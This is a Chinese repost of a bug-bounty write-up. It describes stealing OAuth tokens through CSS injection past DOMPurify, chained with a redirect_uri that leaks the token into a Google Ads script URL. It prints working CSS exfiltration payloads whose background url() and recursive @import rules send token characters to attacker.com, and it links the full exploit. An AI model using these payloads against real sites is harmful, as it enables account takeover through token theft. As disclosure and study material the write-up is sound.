---
title: $8000赏金实录！CSS注入窃取OAuth令牌
url: https://mp.weixin.qq.com/s?__biz=MzU2NzcwNTY3Mg==&mid=2247485332&idx=1&sn=fc13196231063ed5d2c7a7bbe850680e&chksm=fc986eb3cbefe7a518c41c820f0c5c614bbb68d8521fb618713432c656bca0ce091062d4a408&scene=58&subscene=0#rd
source: Hacking就是好玩
date: 2025-02-18
fetch_date: 2025-10-06T20:40:12.762722
---

# $8000赏金实录！CSS注入窃取OAuth令牌

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/eLgL5R4W3Fjibl7CalBDrBfWxrYbjicrUDyIoltKIfDG7Nj9RnWjbibzolXhXHDeC5uibmYMhbnxQY6LVN1VXbtWJA/0?wx_fmt=jpeg)

# $8000赏金实录！CSS注入窃取OAuth令牌

w8ay

Hacking就是好玩

> 字数 1686，阅读大约需 9 分钟

# CSS注入窃取 OAuth 令牌

昨天@YShahinzadeh发文分享了他们通过css数据泄漏导致账户接管的利益，突破了DOMPurify的保护，最终拿到$8000的故事。

今天写了详细的文章，也是css注入的一次真实利用，一起学习一下吧。

本文转自：https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3Fjibl7CalBDrBfWxrYbjicrUDbabM2gzdicSp1U9FKYFQNSRfSg8THfJcaPKc3ghf9v3c0IK3LyJeODQ/640?wx_fmt=png&from=appmsg)

## 漏洞发现

安全研究员Amir和YShahinzadeh在参与某知名漏洞赏金项目时，发现一处HTML注入点。虽然无法触发XSS攻击，但是能够注入到`<style>` 标签中，影响网站的css。但是当前页面上没有任何敏感信息。经过几天的努力，作者成功将其与 OAuth 配置错误结合起来，泄露了受害者的 OAuth 令牌，并两次报告了该漏洞（针对两个不同的端点），并因此获得了 2×4850 美元的奖励。

在我之前的案例中也有类似css注入的例子：【自动化漏洞赏金bugbounty和xscan扫描器总结】[https://mp.weixin.qq.com/s/A6Kjej2pfcCjuY7qey5irw?token=1246607863&lang=zh\_CN](https://mp.weixin.qq.com/s?__biz=MzU2NzcwNTY3Mg==&mid=2247484800&idx=1&sn=7ececf9f462e9e10fd82ed057815b2bf&token=1246607863&lang=zh_CN&scene=21#wechat_redirect "https://mp.weixin.qq.com/s?__biz=MzU2NzcwNTY3Mg==&mid=2247484800&idx=1&sn=7ececf9f462e9e10fd82ed057815b2bf&token=1246607863&lang=zh_CN&scene=21#wechat_redirect")

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3Fjibl7CalBDrBfWxrYbjicrUD01nJfMNq4MaUOYIFRNtibLr3YfJ0Y5u7ic51DVTV0NXgiaqiaDUlPRhib2Q/640?wx_fmt=png&from=appmsg)

情况和他类似，能控制`<style>`中内容，但是由于尖括号被转义，无法xss，只能通过css语法做做钓鱼之类的。

所以更应该好好看看这篇文章，如何提升漏洞的影响。

## 利用过程

### CSS数据泄漏

首先，为什么有人会使用 CSS 来窃取数据？可能有几个原因，比如绕过 CSP（内容安全策略）或 XSS 中的限制。许多网站实施 CSP 以阻止内联 JavaScript 的执行并限制外部脚本，这使得传统的 XSS 攻击更加困难。然而，CSS 在 CSP 规则中通常是被允许的（style-src 比 script-src 更为宽松）。

假设你在 `<style>` 标签中发现了一个反射值，其中尖括号被过滤，因此你无法通过转义标签来实现 XSS。

```
<style>
button {
  background-color: #3498db;
  color: white;
  padding: 10px 20px;
  border-radius: 5px;
  border: &lt;/injet here&gt;;
}
</style>
```

在这种情况下，由于无法实现 XSS，CSS 数据提取就显得很有帮助。CSS 数据提取是一种利用 CSS 属性（如 `background-image` 、 `url()` 以及属性选择器）来泄露敏感信息（例如 CSRF 令牌、密码或用户特定数据）的技术。

假设此时 `target.com` 的目标靶机上存在以下内容

```
<input value="somevalue" type="text">
```

如果想要得到 input 元素的 value，我们可以在 `target.com` 上加载如下 css ：

```
input[value^=a]{
    background-image: url(https://attacker.com/?value=a);
}
input[value^=b]{
    background-image: url(https://attacker.com/?value=b);
}
/* ... */
input[value^=9]{
    background-image: url(https://attacker.com/?value=9);
}
```

`value^=X` 是一个 `CSS Selectors` 表达式，它将匹配所有目标类型中包含属性 value 且其值以前缀 `X` 开头的元素，同时使用目标样式渲染被选择的元素。

由于样式中指定了 `background-image: url()` ，这将触发页面对目标 url `attacker.com/?value=s` 的 HTTP 请求，此时我们通过在 `attacker.com` 上的请求日志就可以得知 value 以 `s` 开头，

### **初始点 + DOMPurify**

目标是 Hackerone 上一个较为知名的公共漏洞赏金计划，遇到了一个受 DOMPurify 保护的反射点。经过一段时间后，作者还是无法绕过 DOMPurify（因为版本比较新）。但是DOMPurify 的默认行为允许 `<style>` 标签，因为它不能用于 XSS 攻击。

```
DOMPurify.sanitize("<b></b><style>body { background-color: black }</style>");
// <b></b><style>body { background-color: black }</style>
```

不幸的是，页面上没有任何与用户相关的敏感信息可供提取。甚至找不到用户名或电子邮件地址，这些虽然微不足道，但仍然值得注意。就在准备放弃的时候，发现了一些新东西。

作者注意到有一个有趣的 `<script>` 标签来自 Google Ads。很多网站都在使用这个功能，作者在这里利用了这个小小的缺陷。

如果向链接添加参数，它们被附加到了 Google Ads 的 URL 上。

例如，如果我打开了 `https://target.com/add-group/[groupname]/add?name=canary` ，脚本源将变为：

```
<script type="text/javascript" async=""
src="https://googleads.g.doubleclick.net/xxx/?random=17xxx%26name%3Dcanary"></script>
```

请注意 `%26name%3Dcanary` 也被加上了。

所以到目前为止，整理到的威胁点：

* • CSS 注入可用于窃取数据
* • url字符能覆盖到google ads

除了css注入外，这里其实没什么特别的。但是如果再结合OAut逻辑，将大不一样。如果将OAuth的重定向url设置为这个url将会怎样呢？

例如

```
https://auth.redacted.com/login?redirect_uri=https://target.com/add-group/[groupname]/add&...
```

受害者一旦打开链接，就会被引导至：

```
https://target.com/add-group/[groupname]/add?auth_token=TOKEN&...
```

接着将导致auth\_token参数泄漏到html中。

```
<script type="text/javascript" async=""
src="https://googleads.g.doubleclick.net/.../?random=17...%26auth_token%3DTOKEN"></script>
```

再结合css注入获取auth\_token值。

一个完美的利用链诞生。

### 利用

理论上成功，实际利用时代码还是很复杂。

css注入的利用代码

```
html:has(script[src*="token=00"]) div {
    background: url(https://attacker.com/leak?chars=00) !important;
    display: block !important;
}
html:has(script[src*="token=01"]) div {
    background: url(https://attacker/leak?chars=01) !important;
    display: block !important;
}
```

在实际利用中，要先遍历第一位字符，如果第一位是0，再来遍历第二位 0[0-9a-z]，再重复此规则。

如果目标token长度是30，暴力枚举就要生成35^30遍，实际利用中不可能成功。

于是作者利用了一个新方法，poc如下

```
@import url(https://attacker.com/next);

html:has(script[src*="token=00"]) div {
    background: url(https://attacker.com/leak?chars=00) !important;
    display: block !important;
}
html:has(script[src*="token=01"]) div {
    background: url(https://attacker/leak?chars=01) !important;
    display: block !important;
}
...
...
...
html:has(script[src*="token=-z"]) div {
    background: url(https://attacker.com/leak?chars=-z) !important;
    display: block !important;
}
html:has(script[src*="token=--"]) div {
    background: url(https://attacker.com/leak?chars=--) !important;
    display: block !important;
}
```

控制自己的服务器，`@import url([https://attacker.com/next](https://attacker.com/next));` 在调用 `/leak` 之前不会返回响应。

`/leak` 一旦匹配器匹配到令牌的前两个正确字节就会立刻返回`/next`，此时就能知道泄漏的前两个字符，`/next` 根据前两个字符再动态生成前四个字符的poc，以此往复。

例如，如果令牌是 `494daa91-2ed4-4132-9e06-b4a5d696750e` ，那么第一次将执行：

```
html:has(script[src*="token=49"]) div {
    background: url(https://attacker.com/leak?chars=49) !important;
    display: block !important;
}
```

随后，服务器响应 `https://attacker.com/next` ，内容如下：

```
@import url(https://attacker.com/next);

html:has(script[src*="token=4900"]) div {
    background: url(https://attacker.com/leak?chars=4900) !important;
    display: block !important;
}
html:has(script[src*="token=4900"]) div {
    background: url(https://attacker.com/leak?chars=4901) !important;
    display: block !important;
}
...
```

递归进行，直到提取出令牌。

### CSS优先级问题

漏洞利用代码中存在问题。当发现一个字符时，页面会加载下一个 CSS URL，但新 CSS 规则的优先级低于旧规则。因此，页面继续使用旧 CSS 规则而不是应用新规则，导致漏洞利用失败。

如以下例子：

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3Fjibl7CalBDrBfWxrYbjicrUDibZhA47Vh9YNyib1ZmicnZMd7wWCv6yW211g6SWBHpTW8icMzsYwwEsE5A/640?wx_fmt=png&from=appmsg)

blue.css是后加载的，由于css优先级无法显示。

所以作者想到可以在css select后面使用`is(div)` 调整优先级。`is()` 是 CSS 伪类函数，用于简化选择器列表的编写。

```
@import url(https://attacker.com/next);

html:has(script[src*="token=49"]) div:is(div) {
    background: url(https://attacker.com/leak?chars=4900) !important;
    display: block !important;
}
```

第二轮

```
html:has(script[src*="token=494d"]) div:is(div):is(div) {
    background: url(https://attacker.com/leak?chars=494d) !important;
    display: block !important;
}
```

最后最终的利用代码如下：https://github.com/VoorivexTeam/CSS-Exfiltration/blob/main/exploit.js

## 最后

在被DOMPurify过滤或者存在css注入时，可以试试这类css注入攻击。另外xscan已支持css注入检测，欢迎使用 :)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FjHty0EhJ3ohRK5fgibRAto40C8GWzr2qkcQTpsQr3YSmiaWSxJsliaX7qic9zVVpU7YcKrgFuXPzjBDg/0?wx_fmt=png)

Hacking就是好玩

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FjHty0EhJ3ohRK5fgibRAto40C8GWzr2qkcQTpsQr3YSmiaWSxJsliaX7qic9zVVpU7YcKrgFuXPzjBDg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过